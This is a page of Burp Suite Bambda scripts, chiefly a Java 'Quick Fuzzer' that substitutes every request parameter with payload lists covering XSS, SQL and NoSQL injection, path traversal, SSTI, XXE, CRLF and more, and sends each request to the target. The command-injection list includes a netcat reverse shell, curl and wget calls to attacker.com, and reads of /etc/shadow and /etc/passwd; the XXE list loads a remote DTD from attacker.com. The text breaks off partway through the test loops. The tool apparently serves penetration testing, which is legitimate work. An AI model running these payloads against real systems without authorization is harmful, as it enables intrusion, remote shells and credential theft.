# Bambda Scripts

<details>

<summary><strong>Quick Fuzzer</strong></summary>

```
//Save as fuzzer.bambda -> Repeater Tab -> Custom-Scripts
// This Bambda extracts all parameters and performs comprehensive fuzzing tests
// You can add/reduce payloads
// You can add/reduce test cases
// Optionally fuzz cookie parameters
// All requests are sent directly without creating new tabs, with detailed logging
// Uncomment and add more payloads as per requirement

// ============================================================
// LIST OF TESTS PERFORMED (25 Test Categories, 137 Payloads per parameter)
// ============================================================
// Test 1:  Special Characters          - 5 payloads
// Test 2:  XSS                         - 7 payloads
// Test 3:  SQL Injection               - 7 payloads
// Test 4:  Empty Values                - 1 payload
// Test 5:  Invalid Dates               - 5 payloads
// Test 6:  Invalid Times               - 5 payloads
// Test 7:  Negative Values             - 1 payload
// Test 8:  Input Length (Long Strings) - 2 payloads
// Test 9:  SSTI                        - 5 payloads
// Test 10: NoSQL Injection             - 4 payloads
// Test 11: Path Traversal              - 8 payloads
// Test 12: Command Injection           - 10 payloads
// Test 13: LDAP Injection              - 4 payloads
// Test 14: JSON Injection              - 4 payloads
// Test 15: Invalid Emails              - 6 payloads
// Test 16: Format String               - 5 payloads
// Test 17: Business Logic              - 4 payloads
// Test 18: XXE Injection               - 5 payloads
// Test 19: CRLF Injection              - 6 payloads
// Test 20: Open Redirect               - 8 payloads
// Test 21: Unicode/Encoding Bypass     - 6 payloads
// Test 22: Null Byte Injection         - 6 payloads
// Test 23: IDOR Patterns               - 9 payloads
// Test 24: Prototype Pollution         - 5 payloads
// Test 25: HTTP Parameter Pollution    - 5 payloads
// ============================================================
// Total Requests = 137 x Number of Parameters
// ============================================================

// Delay variable, Adjust as per requirement - 1000 = 1 second delay
int GLOBAL_DELAY_MS = 100;

// Different Payloads for Different Attack Types, Add more as per requirement
String[] SPECIAL_CHARS = {
    "!@#$%^&*()",
    "<>\"'",
    "[]{}|\\",
    "~`+=",
    ";:,./?",
    "%$#@!^*()_+",
    "\'\";:,.<>/?|{}[]",
    "\\\\\\\\",
    "--++==",
    "(){}[]<>"
};

String[] XSS_PAYLOADS = {
    "<script>alert('XSS')</script>",
    "<img+src=x+onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg+onload=alert('XSS')>",
    "'-alert('XSS')-'",
    "\"><script>alert('XSS')</script>",
    "<iframe+src=javascript:alert('XSS')></iframe>",
    "<body+onload=alert('XSS')>",
    "<details/open+ontoggle=alert('XSS')>",
    "<input+onfocus=alert('XSS')+autofocus>",
    "<marquee+onstart=alert('XSS')>",
    "<a+href=javascript:alert('XSS')>click</a>",
    "<img+src=1+onerror=prompt(1)>",
    "<svg><script>alert(1)</script></svg>"
};

String[] SQLI_PAYLOADS = {
    "'+OR+'1'='1",
    "'",
    "\"",
    "'+OR+1=1#",
    "admin'--",
    "'+OR+'a'='a",
    "1'+OR+'1'='1'+/*",
    "'--+-",
    "'++OR+1=1--",
    "'++UNION++SELECT+NULL--",
    "'++AND+1=1--",
    "'++AND+1=2--",
    "'++WAITFOR+DELAY+'0:0:5'--",
    "'++SLEEP(5)--",
    "'++OR+sleep(5)--",
    "'++OR+benchmark(1000000,MD5(1))--"
};

// Command Injection Payloads
String[] COMMAND_INJECTION_PAYLOADS = {
    ";+ls+-la",
    "|+whoami",
    "&+dir",
    "`id`",
    "$(whoami)",
    ";+cat+/etc/passwd",
    "&&+echo+vulnerable",
    ";+ping+-c+1+127.0.0.1",
    "|+type+C:\\Windows\\System32\\drivers\\etc\\hosts",
    "$(ping+-c+1+127.0.0.1)",
    "|+ls",
    "&+whoami",
    ";+id",
    "|+cat+/etc/shadow",
    "|+nc+-e+/bin/sh+attacker.com+4444",
    "|+powershell+whoami",
    "|+bash+-i",
    "|+curl+http://attacker.com",
    "|+wget+http://attacker.com"
};

// Path Traversal/Directory Traversal
String[] PATH_TRAVERSAL_PAYLOADS = {
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00",
    "file:///etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%2f..%2f..%2fetc%2fshadow",
    "..\\..\\..\\boot.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "..%255c..%255c..%255cwindows%255cwin.ini",
    "..%c1%1c..%c1%1c..%c1%1cwindows%5cwin.ini",
    "..%c0%ae..%c0%ae..%c0%aeetc%c0%aepasswd",
    "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd"
};

// LDAP Injection
String[] LDAP_INJECTION_PAYLOADS = {
    "*",
    "*)(&",
    "*))%00",
    ")(cn=*",
    //    "*)(uid=*",
    //    "admin)(&(password=*))",
    "*()|%26'",
    "*%29%28%7C%28objectClass%3D*",
    "*%28%7C%28objectClass%3D*",
    "*%29%28uid%3D*",
    "*%29%28mail%3D*",
    "*%29%28password%3D*",
    "*%29%28cn%3D*",
    "*%29%28sn%3D*"
};

// NoSQL Injection
String[] NOSQL_INJECTION_PAYLOADS = {
    "true,+$where:+'1+==+1'",
    ",+$where:+'1+==+1'",
    "$ne=1",
    "[$ne]=1",
    //    "';+return+true;+var+dummy='",
    //    "{\"$gt\":\"\"}",
    //    "{\"$regex\":\".*\"}",
    "{$ne:null}",
    "{$gt: ''}",
    "{$lt: ''}",
    "{$in: [null, 1, 'a']}",
    "'||1==1||'",
    "'||a==a||'",
    "admin' || '1'=='1"
};

// Server-Side Template Injection (SSTI)
String[] SSTI_PAYLOADS = {
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{config}}",
    "<%=7*7%>",
    //    "${jndi:ldap://attacker.com/a}",
    //    "{{request.application.__globals__}}",
    "{{self}}",
    "{{request}}",
    "{{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}",
    "{{().__class__.__bases__[0].__subclasses__()}}",
    "{{[].__class__.__mro__[2].__subclasses__()}}",
    "${{7*'7'}}",
    "<%={{7*7}}%>"
};

// Format String Vulnerabilities
String[] FORMAT_STRING_PAYLOADS = {
    "%s%s%s%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x%x%x%x%x",
    "%n%n%n%n%n%n%n%n%n%n",
    "%08x.%08x.%08x.%08x",
    "AAAA%08x.%08x.%08x.%08x",
    "%99999999999s",
    "%99999999999d",
    "%99999999999x",
    "%99999999999n",
    "%p %p %p %p %p",
    "%#x",
    "%#n"
};

// Email Validation Bypass
String[] EMAIL_BYPASS_PAYLOADS = {
    "test@test@test.com",
    "test..test@test.com",
    "test@",
    "@test.com",
    "test@test.",
    "\"test\"@test.com",
    "test@.com",
    "test@com",
    "test@-test.com",
    "test@%31.com",
    "test@sub..test.com",
    "test@sub_test.com",
    "test@sub+test.com"
};

// JSON Injection
String[] JSON_INJECTION_PAYLOADS = {
    "\",\"injected\":\"true\",\"a\":\"",
    "\"}}],\"injected\":true,\"a\":[{\"b\":\"",
    "\",\"admin\":true,\"test\":\"",
    "\\\":\\\"\\\"}],\\\"injected\\\":true}",
    "\",\"isAdmin\":true,\"foo\":\"",
    "\",\"$ne\":null,\"foo\":\"",
    "\",\"$gt\":\"\",\"foo\":\"",
    "\",\"$or\":[{},{}],\"foo\":\"",
    "\",\"$where\":\"1==1\",\"foo\":\""
};

// Business Logic Tests
String[] BUSINESS_LOGIC_PAYLOADS = {
    "0",
    "-1",
    "true",
    "false",
    "999999999",
    "-999999999",
    "0.00",
    "-0.01",
    "null",
    "undefined",
    "NaN",
    "Infinity",
    "-Infinity"
};


String[] INVALID_DATES = {
    "2024-13-01",
    "2024-02-30",
    "2024-00-15",
    "2024-12-32",
    "32/13/2024",
    "2024-02-31",
    "2024-04-31",
    "2024-06-31",
    "2024-09-31",
    "2024-11-31",
    "2024-00-00",
    "2024-99-99"
};

String[] INVALID_TIMES = {
    "25:30:00",
    "12:70:30",
    "10:30:70",
    "99:99:99",
    "ab:cd:ef",
    "24:00:00",
    "00:60:00",
    "00:00:60",
    "99:99:99",
    "12:34:99",
    "99:99:99AM",
    "99:99:99PM"
};

// XML/XXE Injection
String[] XXE_PAYLOADS = {
    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/windows/win.ini\">]>",
    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+%+xxe+SYSTEM+\"http://attacker.com/evil.dtd\">%xxe;]>",
    "<!ENTITY+xxe+SYSTEM+\"expect://id\">",
    "<![CDATA[<script>alert('XXE')</script>]]>",
    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/shadow\">]>",
    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///proc/self/environ\">]>",
    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"http://127.0.0.1:8080/evil.dtd\">]>",
    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///windows/win.ini\">]>"
};

// CRLF Injection
String[] CRLF_PAYLOADS = {
    "%0d%0aHeader-Injection:+true",
    "%0aHeader-Injection:+true",
    "%0d%0a%0d%0a<script>alert('CRLF')</script>",
    "\\r\\nHeader-Injection:+true",
    "%E5%98%8A%E5%98%8DHeader-Injection:+true",
    "%0d%0aSet-Cookie:+injected=true",
    "%0d%0aContent-Length:+0",
    "%0d%0aLocation:+evil.com",
    "%0d%0aRefresh:+0;url=evil.com",
    "%0d%0aX-Injected:+true",
    "%0d%0aX-Forwarded-For:+evil.com",
    "%0d%0aX-Real-IP:+evil.com"
};

// Open Redirect
String[] OPEN_REDIRECT_PAYLOADS = {
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "//evil.com/%2f..",
    "////evil.com",
    "https:evil.com",
    "//%0d%0aevil.com",
    "/%09/evil.com",
    "//attacker.com",
    "//google.com",
    "//127.0.0.1",
    "//localhost",
    "//0.0.0.0",
    "//[::1]",
    "//user:pass@evil.com",
    "//evil.com#@google.com"
};

// Unicode/Encoding Bypass
String[] UNICODE_BYPASS_PAYLOADS = {
    "%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e",
    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
    "%c0%3cscript%c0%3ealert('XSS')%c0%3c/script%c0%3e",
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
    "%e0%80%3cscript%e0%80%3e",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "%u003Cscript%u003Ealert('XSS')%u003C/script%u003E",
    "%u003Cimg+src=x+onerror=alert('XSS')%u003E",
    "%u003Csvg+onload=alert('XSS')%u003E",
    "%u003Ciframe+src=javascript:alert('XSS')%u003E%u003C/iframe%u003E",
    "%u003Cbody+onload=alert('XSS')%u003E",
    "%u003Cmarquee+onstart=alert('XSS')%u003E"
};

// Null Byte Injection
String[] NULL_BYTE_PAYLOADS = {
    "%00",
    "%00.jpg",
    "test%00.jpg",
    "..%00/etc/passwd",
    "test.php%00.jpg",
    "\\0",
    "%00.png",
    "%00.gif",
    "%00.txt",
    "%00.html",
    "%00.php",
    "%00.asp",
    "%00.jsp"
};

// IDOR Patterns
String[] IDOR_PAYLOADS = {
    "1",
    "0",
    "2",
    "100",
    "999",
    "-1",
    "admin",
    "user",
    "test",
    "guest",
    "root",
    "superuser",
    "administrator",
    "owner",
    "manager",
    "support",
    "qa",
    "dev"
};

// Prototype Pollution
String[] PROTOTYPE_POLLUTION_PAYLOADS = {
    "__proto__[test]=polluted",
    "constructor[prototype][test]=polluted",
    "__proto__.test=polluted",
    "{\"__proto__\":{\"polluted\":true}}",
    "constructor.prototype.polluted=true",
    "__proto__.admin=true",
    "__proto__.isAdmin=true",
    "__proto__.polluted=1",
    "constructor.prototype.isAdmin=true",
    "constructor.prototype.polluted=1"
};

// HTTP Parameter Pollution
String[] HPP_PAYLOADS = {
    "&admin=true",
    "&role=admin",
    "&id=1&id=2",
    "&debug=true",
    "&test=1",
    "&user=admin",
    "&user=guest",
    "&user=superuser",
    "&user=administrator",
    "&user=owner",
    "&user=manager",
    "&user=support"
};

// Get the request
var originalRequest = requestResponse.request();
var httpService = requestResponse.httpService();

// Extract all parameters based on request type
java.util.List < burp.api.montoya.http.message.params.HttpParameter > allParams = new java.util.ArrayList <> ();

// Add URL parameters (GET)
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.URL));

// Add body parameters (POST)
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.BODY));

// Add JSON Parameters 
//String contentType = originalRequest.contentType().toString();
//if (contentType != null && 
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.JSON));

// ------------------------------------------------------------ //
// -- Uncomment below line to fuzz cookie parameters as well -- //
//allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.COOKIE));

// if there are no parameter to fuzz then exit
if (allParams.isEmpty()) {
    logging().logToOutput("No parameters found to fuzz");
}

logging().logToOutput("[ ======================================= ]");
logging().logToOutput("QUICK FUZZER STARTED");
logging().logToOutput("Found " + allParams.size() + " parameters to test");
logging().logToOutput("Target: " + httpService.host() + ":" + httpService.port());
logging().logToOutput("[ ======================================= ]");
logging().logToOutput("CHECK ORGANIZER TAB FOR OUTPUT");
logging().logToOutput("[ ======================================= ]");

// Counter for tracking total requests
int totalRequests = 0;
StringBuilder results = new StringBuilder();
results.append("FUZZING RESULTS SUMMARY:\n\n");

// ------------------------------------------------------------ //
// --------------- FUZZING Starts ----------------------------- //

// for each parameter, perform all fuzzing tests
for (burp.api.montoya.http.message.params.HttpParameter param: allParams) {
    String paramName = param.name();
    String originalValue = param.value();

    logging().logToOutput("\n[ === Testing Parameter: " + paramName + " (original: '" + originalValue + "') === ]");
    results.append("Parameter: " + paramName + " (Type: " + param.type() + ")\n");
    results.append("Original Value: " + originalValue + "\n");
    logging().logToOutput("[ ======================================= ]\n");

    // -------------------------- Test 1: Special Characters -------------------- //
    logging().logToOutput("[ === Testing Special characters === ] ");
    for (String specialChar: SPECIAL_CHARS) {
    	String newValue = originalValue + specialChar;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, newValue, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "SPECIAL CHAR: '" + specialChar;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Special Char '" + specialChar + "': " + e.getStackTrace());
        }

    }

    // -------------------------- Test 2: XSS -------------------- //
    logging().logToOutput("[ === Testing XSS PAYLOADS === ] ");
    for (String xssPayload: XSS_PAYLOADS) {
        //String newValue = originalValue + xssPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, xssPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "XSS Payload: '" + xssPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with XSS Payload '" + xssPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 3: SQLI -------------------- //
    logging().logToOutput("[ === Testing SQLI PAYLOADS === ] ");
    for (String sqliPayload: SQLI_PAYLOADS) {
    	String newValue = originalValue + sqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, newValue, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "SQLI Payload: '" + sqliPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with SQLI Payload '" + sqliPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 4: EMPTY VALUES -------------------- //
    logging().logToOutput("[ === Testing EMPTY PAYLOADS === ] ");
    var modifiedRequestEmpty = originalRequest.withParameter(
        burp.api.montoya.http.message.params.HttpParameter.parameter(
            paramName, "", param.type())
    );

    try {
        var httpRequestResponse = api().http().sendRequest(modifiedRequestEmpty);
     	int status = httpRequestResponse.response().statusCode();
    	String result = "EMPTY: " + paramName + " -> Status: " + status;

        // set annotations
        httpRequestResponse.annotations().setNotes(result);
        // send to organizer
        api().organizer().sendToOrganizer(httpRequestResponse);
        totalRequests++;
    } catch (Exception e) {
        logging().logToError("[ ======================================= ]");
        logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
        logging().logToError("[ ======================================= ]");
        logging().logToError("Error with EMPTY Payload '" + paramName + "': " + e.getStackTrace());
    }

    // -------------------------- Test 5: INVALID DATES -------------------- //
    for (String date: INVALID_DATES) {
        //String newValue = originalValue + date;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, date, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "INVALID DATE: '" + date;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with INVALID DATE '" + date + "': " + e.getStackTrace());
        }
    }


    // -------------------------- Test 6: INVALID TIME -------------------- //
    for (String time: INVALID_TIMES) {
        //String newValue = originalValue + date;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, time, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "INVALID DATE: '" + time;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with INVALID TIME '" + time + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 7: NEGATIVE VALUES -------------------- //
    logging().logToOutput("[ === Testing NEGATIVE PAYLOADS === ] ");
    String negativeValue = "-" + originalValue;
    var modifiedRequestNegative = originalRequest.withParameter(
        burp.api.montoya.http.message.params.HttpParameter.parameter(
            paramName, negativeValue, param.type())
    );

    try {
        var httpRequestResponse = api().http().sendRequest(modifiedRequestNegative);
     	int status = httpRequestResponse.response().statusCode();
    	String result = "NEGATIVE: " + paramName + " -> Status: " + status;

        // set annotations
        httpRequestResponse.annotations().setNotes(result);
        // send to organizer
        api().organizer().sendToOrganizer(httpRequestResponse);
        totalRequests++;
    } catch (Exception e) {
        logging().logToError("[ ======================================= ]");
        logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
        logging().logToError("[ ======================================= ]");
        logging().logToError("Error with NEGATIVE Payload '" + paramName + "': " + e.getStackTrace());
    }

    // -------------------------- Test 8: INPUT LENGTH -------------------- //
    logging().logToOutput("[ === Testing INPUT LENGTH === ] ");
    StringBuilder longCharString = new StringBuilder();
    for (int i = 0; i < 300; i++) {
        longCharString.append("a");
    }
    StringBuilder longIntString = new StringBuilder();
    for (int i = 0; i < 300; i++) {
        longIntString.append("1");
    }

    ArrayList < StringBuilder > longStrings = new ArrayList <> ();
    longStrings.add(longIntString);
    longStrings.add(longCharString);

    for (StringBuilder longString: longStrings) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, longString.toString(), param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "Long String: ";
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Long String:  '" + longString.toString() + "': " + e.getStackTrace());
        }
    }


    // -------------------------- Test 9: SSTI -------------------- //
    logging().logToOutput("[ === Testing SSTI PAYLOADS === ] ");
    for (String sstiPayload: SSTI_PAYLOADS) {
        //String newValue = originalValue + xssPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, sstiPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "SSTI Payload: '" + sstiPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with SSTI Payload '" + sstiPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 10: NOSQLI -------------------- //
    logging().logToOutput("[ === Testing NOSQLI PAYLOADS === ] ");
    for (String nosqliPayload: NOSQL_INJECTION_PAYLOADS) {
    	String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, newValue, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "NOSQLI Payload: '" + nosqliPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with NOSQLI Payload '" + nosqliPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 11: Path Traversal -------------------- //
    logging().logToOutput("[ === Testing Path Traversal PAYLOADS === ] ");
    for (String pathPayload: PATH_TRAVERSAL_PAYLOADS) {
        //String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, pathPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "Path Traversal Payload: '" + pathPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Path Traversal Payload '" + pathPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 12: Command Injection -------------------- //
    logging().logToOutput("[ === Testing Command Injection PAYLOADS === ] ");
    for (String commandPayload: COMMAND_INJECTION_PAYLOADS) {
        //String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, commandPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "Command Injection Payload: '" + commandPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Command Injection Payload '" + commandPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 13: LDAP Injection -------------------- //
    logging().logToOutput("[ === Testing LDAP Injection PAYLOADS === ] ");
    for (String ldapPayload: LDAP_INJECTION_PAYLOADS) {
        //String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, ldapPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "LDAP Injection Payload: '" + ldapPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with LDAP Injection Payload '" + ldapPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 14: JSON Injection -------------------- //
    logging().logToOutput("[ === Testing JSON Injection PAYLOADS === ] ");
    for (String jsonPayload: JSON_INJECTION_PAYLOADS) {
        //String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, jsonPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "JSON Injection Payload: '" + jsonPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
